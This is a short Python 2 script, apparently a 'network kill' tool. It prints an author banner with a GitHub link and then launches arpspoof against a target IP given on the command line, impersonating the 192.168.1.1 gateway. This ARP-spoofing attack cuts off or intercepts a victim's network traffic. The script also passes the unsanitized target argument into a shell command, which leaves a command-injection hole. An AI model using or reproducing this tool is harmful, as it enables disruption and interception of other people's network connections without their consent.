#!/usr/bin/python

import sys
import subprocess

print ''
print ''
print'----------------------------'
print "OK Killing : ",sys.argv[1]
print'----------------------------'
print 'for exit press control + C'
print'----------------------------'
print ''
print ''
print'----------------------------'
print 'Programming by iProgramer'
print'----------------------------'
print 'twitter : h_iprogramer'
print'----------------------------'
print 'Help me to improve this project'
print'----------------------------'
print 'github : https://github.com/h-iprogramer/networkKill-IOS.git'
print '---------------------------'
print ''
print ''

if len(sys.argv) > 1 : p = subprocess.Popen("arpspoof -i en0 -t %s 192.168.1.1" % (sys.argv[1], ), shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


